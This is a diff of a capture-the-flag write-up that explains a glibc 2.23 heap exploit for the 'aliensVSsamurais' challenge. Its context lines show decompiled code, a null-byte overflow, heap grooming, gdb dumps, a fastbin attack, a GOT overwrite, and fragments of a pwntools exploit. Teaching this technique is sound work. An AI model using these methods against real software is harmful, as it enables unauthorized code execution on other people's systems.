@@ -2,7 +2,7 @@
 
 Let's take a look at the binary and libc:
 
-```
+```console
 $    ./libc-2.23.so
 GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
 Copyright (C) 2016 Free Software Foundation, Inc.
@@ -41,7 +41,7 @@ So we are dealing with a `64` bit binary, with the `libc-2.23.so` libc. The bina
 
 When we take a look at the main function, we see this:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -56,7 +56,7 @@ undefined8 main(void)
 
 So we can see it calls three functions, `dojo`, `hatchery`, and `invasion`. After it calls `dojo`, it saves the hooks for malloc and free (which will cause us problems later). Looking at `dojo`, we see that it is a menu with three options.
 
-```
+```c
 void dojo(void)
 
 {
@@ -89,7 +89,7 @@ void dojo(void)
 
 We see that option `1` will allow us to allocate a new samurai (essentially allocating a chunk), option `2` will allow us to kill a samurai (essentially freeing the chunk), and option `3` is to move on to the next menu. I didn't find any bugs in these sub functions, or really anything too interesting (plus aliens are cooler, you can guess who I played in Alien VS Predator). So next up we have `hatchery`:
 
-```
+```c
 void hatchery(void)
 
 {
@@ -128,7 +128,7 @@ void hatchery(void)
 
 So with this menu, we can make aliens (`1`), kill aliens (`2`), and rename aliens (`3`). Looking at `new_alien` we see this:
 
-```
+```c
 void new_alien(void)
 
 {
@@ -181,20 +181,20 @@ void new_alien(void)
 
 So we can see how the aliens are made. We can specify the size and content for the name of the alien, but it has to be greater than or equal to `8`. We can see that our aliens are kept in the bss array `aliens` stored at offset `0x3020c0`. We can also see that it keeps track of how many aliens there are with the bss variable `alien_index` at offset `0x3020b0`. We see that the limit on the amount of aliens we can make is `200`. Also before malloc is called, it checks to see if the malloc hook has changed. Since `malloc` is only ever called here and in the samurai menu, unless if we can change the value of `saved_malloc_hook`, attacking the malloc hook isn't feasible. Also we can see the structure of an alien:
 
-```
+```text
 0x0:    ptr to alien name (chunks size and content we control)
 0x8:    0x100 (for how we do things, doesn't really matter too much)
 ```
 
 Also we can see that there is a null byte overflow bug with how it does it's null termination:
-```
+```c
         bytesRead = read(0,*alienPtr,nameSize);
         *(undefined *)((long)(int)bytesRead + (long)*alienPtr) = 0;
 ```
 
 Next up we have:
 
-```
+```c
 void consume_alien(void)
 
 {
@@ -228,7 +228,7 @@ void consume_alien(void)
 
 So it checks to see if `index` is less than the index we provide as a validation (however this check isn't enough by itself). If we pass the check (and if the hook for free has not been changed) it will run `kill_alien`:
 
-```
+```c
 void kill_alien(long alien)
 
 {
@@ -242,7 +242,7 @@ void kill_alien(long alien)
 
 So we can see it frees both pointers associated with the alien, and zeroes out the pointer in the aliens array. Finally we have `rename_alien`:
 
-```
+```c
 void rename_alien(void)
 
 {
@@ -271,7 +271,7 @@ So we can see that it prompts us for an index to `aliens`, then prints the conte
 
 For `invasion` we can see that it checks the aliens / samurai that you have, and depending on the outcome, it will either run `win` or `loose`. For my exploit, I didn't really hit this code path so none of it is really relevant:
 
-```
+```c
 void invasion(void)
 
 {
@@ -304,7 +304,7 @@ So we have two null byte overflows, and an index bug. The plan is to leverage th
 
 However before that, things that affected this exploit. First off there was one malloc check that caused some issues with the fast bin attack:
 
-```
+```c
       if (victim != 0)
         {
           if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
@@ -324,7 +324,7 @@ However before that, things that affected this exploit. First off there was one 
 
 The `malloc(): memory corruption (fast)` check requires the size of our fast bin chunk to correspond with the `idx` it is being allocated from. So if it is in idx `6`, the sizes have to fit into the range for that `idx`. One strategy to pass this check is to position your fake fast bin chunk in such a way that it reads the top byte of a previous value as the size. For instance let's say we wanted to allocate a chunk at `0x55c8a58620a0`
 
-```
+```gdb
 gef➤  x/4g 0x55c8a5862088
 0x55c8a5862088: 0x0 0x7fb43c93b8e0
 0x55c8a5862098: 0x0 0x0
@@ -332,7 +332,7 @@ gef➤  x/4g 0x55c8a5862088
 
 We would try to allocate a chunk at `0x55c8a586209d`, that way we get alignment for our size to be `0x7f`:
 
-```
+```gdb
 gef➤  x/4g 0x55c8a586208d
 0x55c8a586208d: 0xb43c93b8e0000000  0x7f
 0x55c8a586209d: 0x0 0x0
@@ -340,7 +340,7 @@ gef➤  x/4g 0x55c8a586208d
 
 Which would correspond to a valid size for this check for this idx it is in (`5`):
 
-```
+```gdb
 gef➤  heap bins
 [+] No Tcache in this version of libc
 ────────────────────── Fastbins for arena 0x7fb43c93bb20 ──────────────────────
@@ -370,7 +370,7 @@ And one last thing, all of the infoleaks for my exploit came from the `printf` c
 
 For the libc infoleak, due to the version of libc it is we can leak arena pointers in the typical way via heap consolidation so the heap things it begins at the start of an allocated chunk. However before we start doing that, we need to deal with an alignment issue. This is because whenever we make a new alien, the code will allocate an `0x10` size chunk. To deal with this so we can align the chunks we want for the attack, I just allocated and freed four aliens was a chunk size of `0x20` (because the rounded up malloc size of a `0x10` chunk is `0x20`). After that I didn't have any alignment issues:
 
-```
+```text
 0x20: 0
 0x20: 1
 0x20: 2
@@ -379,7 +379,7 @@ For the libc infoleak, due to the version of libc it is we can leak arena pointe
 
 We start off the libc infoleak with these chunks:
 
-```
+```text
 0xf0: 4
 0x60: 5
 0xf0: 6
@@ -388,7 +388,7 @@ We start off the libc infoleak with these chunks:
 
 then we free chunks `4` and `5`:
 
-```
+```text
 0xf0: 4 (freed)
 0x60: 5 (freed)
 0xf0: 6
@@ -397,7 +397,7 @@ then we free chunks `4` and `5`:
 
 Then we allocate an `0x68` byte chunk, which will go where the old chunk `5` used to. We will overflow the size for chunk `6` with a null byte, which will set the previous in use bit to zero, so malloc thinks the previous chunk has been freed (which it hasn't). We will also set the previous size equal to `0x170` so it thinks the previous chunk started where the old chunk `4` was:
 
-```
+```text
 0xf0: 4 (freed)
 0x68: 8
 0xf0: 6 previous size 0x170, previous in use bit set to 0x0
@@ -406,7 +406,7 @@ Then we allocate an `0x68` byte chunk, which will go where the old chunk `5` use
 
 After that we will free chunk `6`, which will cause it to consolidate with the old chunk `4` (adding it to the unsorted bin), essentially causing the heap to forget about chunk `8`:
 
-```
+```text
 0xf0: 4 (freed, and heap consolidated here, start of unsorted bin)
 0x68: 8 (forgotten about)
 0xf0: 6 (freed)
@@ -415,7 +415,7 @@ After that we will free chunk `6`, which will cause it to consolidate with the o
 
 Now we will allocate an `0xf0` size chunk, which will come from the unsorted bin. This will move the beginning unsorted bin up to overlap with chunk `8`. Since the beginning of the unsorted bin has a libc arena pointer, we can just edit the alien at the address, and we will get a libc infoleak. Also whenever I got an infoleak, I just wrote over the value with itself, so I didn't actually change anything.
 
-```
+```text
 0xf0: 9
 0x68: 8 (forgotten about, start of unsorted bin)
 0xf0: 6 (freed)
@@ -424,7 +424,7 @@ Now we will allocate an `0xf0` size chunk, which will come from the unsorted bin
 
 As for the pie infoleak, when we look at the memory around `aliens` and the got table, we see something interesting:
 
-```
+```gdb
 gef➤  telescope 0x56545ff99ff0 40
 0x000056545ff99ff0│+0x0000: 0x0000000000000000
 0x000056545ff99ff8│+0x0008: 0x00007f36fc8cc2d0  →  <__cxa_finalize+0> push r15
@@ -476,7 +476,7 @@ With that, we have our PIE/libc infoleaks.
 
 So the libc infoleak left us off at a pretty good spot for the fast bin attack, since the unsorted bin overlaps with an allocated chunk. With how we have groomed the heap, we can just allocate an `0x60` byte chunk, which will come from the unsorted bin and overlap directly with our chunk `8`:
 
-```
+```text
 0xf0:       9
 0x68/0x60:  8 & 10 (2 overlapping chunks)
 0xf0:       6 (freed)
@@ -487,7 +487,7 @@ Now we can free chunk `10`, which will insert it into the fast bin. Then leverag
 
 Before the write:
 
-```
+```gdb
 gef➤  heap bins
 [+] No Tcache in this version of libc
 ────────────────────── Fastbins for arena 0x7fbdc9a1ab20 ──────────────────────
@@ -509,7 +509,7 @@ Fastbins[idx=6, size=0x70] 0x00
 ```
 
 After the write:
-```
+```gdb
 gef➤  heap bins
 [+] No Tcache in this version of libc
 ────────────────────── Fastbins for arena 0x7fbdc9a1ab20 ──────────────────────
@@ -532,7 +532,7 @@ Fastbins[idx=6, size=0x70] 0x00
 
 Now let's take a close look at where I decided to make this fake chunk:
 
-```
+```gdb
 gef➤  x/20g 0x5560129ef088
 0x5560129ef088: 0x0 0x7fbdc9a1a8e0
 0x5560129ef098: 0x0 0x0
@@ -561,7 +561,7 @@ We can see that our fake chunk will be near the start of aliens, and then with o
 
 Here we can see the memory corruption play out. I needed to restart the exploit, and because of aslr, the addresses changed:
 
-```
+```gdb
 gef➤  x/20g 0x563912451088
 0x563912451088: 0x0 0x7fc5ac1ba8e0
 0x563912451098: 0x0 0x0
@@ -577,7 +577,7 @@ gef➤  x/20g 0x563912451088
 
 Then we allocate our fake fast bin chunk and write the pointers:
 
-```
+```gdb
 gef➤  x/20g 0x563912451088
 0x563912451088: 0x0 0x7fc5ac1ba8e0
 0x563912451098: 0x3935310000000000  0x5639124510a8
@@ -601,7 +601,7 @@ Then we do our got overwrite, and we get a shell!
 
 Putting it all together, we get the following exploit:
 
-```
+```python
 from pwn import *
 
 target = process("./aliensVSsamurais", env={"LD_PRELOAD":"./libc-2.23.so"})
@@ -725,7 +725,7 @@ target.interactive()
 
 When we run the exploit:
 
-```
+```console
 $ python exploit.py
 [+] Starting local process './aliensVSsamurais': pid 18692
 [*] '/Hackery/pod/modules/custom_misc_heap/csaw18_alienVSsamurai/aliensVSsamurais'
